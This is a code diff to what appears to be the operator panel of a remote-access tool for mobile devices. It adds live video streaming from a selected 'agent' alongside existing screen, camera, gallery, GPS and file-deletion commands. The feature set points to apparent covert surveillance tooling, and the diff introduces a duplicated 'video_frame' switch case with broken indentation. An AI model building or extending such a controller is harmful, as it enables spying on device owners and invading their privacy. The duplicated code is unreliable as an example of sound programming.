@@ -212,7 +212,9 @@ function handleWebSocketMessage(data) {
         case 'screen_frame':
             handleScreenFrame(data.agent_id, data.frame);
             break;
-            
+        case 'video_frame':
+    handleVideoFrame(data.agent_id, data.frame);
+    break;    
         case 'video_frame':
             handleVideoFrame(data.agent_id, data.frame);
             break;
@@ -983,6 +985,32 @@ if (command === 'GET_GALLERY' || command.startsWith('GET_GALLERY ')) {
         }
         return;
     }
+    
+    // Video Stream
+if (command === 'VIDEO_STREAM_START' || command.startsWith('VIDEO_STREAM_START ')) {
+    console.log('🎬 Video stream start response:', result);
+    if (result.status === 'success' || result.status === 'pending') {
+        addOutputLine(`🎬 Video stream started!`, 'success');
+    }
+    return;
+}
+
+if (command === 'VIDEO_STREAM_STOP' || command.startsWith('VIDEO_STREAM_STOP ')) {
+    console.log('⏹️ Video stream stop response:', result);
+    addOutputLine(`⏹️ Video stream stopped`, 'info');
+    resetVideoStream();
+    return;
+}
+
+if (command === 'VIDEO_STREAM_STATUS' || command.startsWith('VIDEO_STREAM_STATUS ')) {
+    console.log('📊 Video stream status:', result);
+    if (result.is_streaming) {
+        addOutputLine(`🎬 Streaming active - ${result.frame_count || 0} frames`, 'success');
+    } else {
+        addOutputLine(`⏹️ Streaming inactive`, 'info');
+    }
+    return;
+}
     
     // DELETE_FILE
     if (command === 'DELETE_FILE' || command.startsWith('DELETE_FILE ')) {
@@ -4521,6 +4549,60 @@ function handleCameraFrame(agentId, frame) {
     }
 }
 
+// ==================== VIDEO STREAM FUNCTIONS ====================
+
+function startVideoStream() {
+    if (!selectedAgent) {
+        addOutputLine('⚠️ Select agent first', 'error');
+        return;
+    }
+    sendCommand('VIDEO_STREAM_START');
+    addOutputLine(`🎬 Starting realtime video stream for ${selectedAgent}`, 'info');
+    switchToTab('livemirror');
+    
+    // Tampilkan loading
+    const container = DOM.livemirrorContent;
+    if (container) {
+        container.innerHTML = `
+            <div style="text-align:center;padding:30px;color:#00d2ff;">
+                <div style="font-size:40px;">🎬</div>
+                <div style="font-size:14px;margin-top:8px;">Starting realtime stream...</div>
+                <div style="font-size:11px;color:#6b7a8a;margin-top:4px;">Please grant permission on device</div>
+            </div>
+        `;
+    }
+}
+
+function stopVideoStream() {
+    if (!selectedAgent) {
+        addOutputLine('⚠️ Select agent first', 'error');
+        return;
+    }
+    sendCommand('VIDEO_STREAM_STOP');
+    addOutputLine(`⏹️ Stopping video stream for ${selectedAgent}`, 'info');
+    resetVideoStream();
+}
+
+function getVideoStreamStatus() {
+    if (!selectedAgent) {
+        addOutputLine('⚠️ Select agent first', 'error');
+        return;
+    }
+    sendCommand('VIDEO_STREAM_STATUS');
+}
+
+function resetVideoStream() {
+    const container = DOM.livemirrorContent;
+    if (container) {
+        container.innerHTML = `
+            <div class="info">🎬 Video Stream</div>
+            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+                Start with <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#00d2ff;">VIDEO_STREAM_START</code>
+            </div>
+        `;
+    }
+}
+
 function showCameraPreview(frame) {
     const container = document.getElementById('camera-content');
     if (!container) return;
@@ -5383,6 +5465,56 @@ function handleGPSStatus(data) {
             </div>
         </div>
     `;
+}
+
+function handleVideoFrame(agentId, frame) {
+    if (selectedAgent !== agentId && selectedAgent) return;
+    
+    const container = DOM.livemirrorContent;
+    if (!container) return;
+    
+    let video = container.querySelector('#live-mirror-video');
+    if (!video) {
+        video = document.createElement('img');
+        video.id = 'live-mirror-video';
+        video.style.cssText = `
+            width: 100%;
+            max-width: 800px;
+            max-height: 600px;
+            border-radius: 8px;
+            border: 2px solid #00d2ff;
+            box-shadow: 0 0 40px rgba(0, 210, 255, 0.2);
+            background: #0a0e17;
+            display: block;
+            margin: 0 auto;
+            object-fit: contain;
+        `;
+        container.appendChild(video);
+        
+        const info = document.createElement('div');
+        info.id = 'live-stream-info';
+        info.style.cssText = `
+            text-align: center;
+            color: #51cf66;
+            font-size: 12px;
+            padding: 6px 0;
+            font-family: 'Courier New', monospace;
+        `;
+        info.textContent = '🎬 Realtime Stream - Active';
+        container.appendChild(info);
+    }
+    
+    if (frame && frame.data) {
+        video.src = `data:image/jpeg;base64,${frame.data}`;
+        
+        const info = container.querySelector('#live-stream-info');
+        if (info) {
+            const frameNum = frame.frame_number || 0;
+            const size = frame.size || frame.data.length;
+            info.textContent = `🎬 Realtime Stream - Frame #${frameNum} | ${formatSize(size)} | Active`;
+            info.style.color = '#51cf66';
+        }
+    }
 }
 
 // ==================== ABOUT & HELP ====================
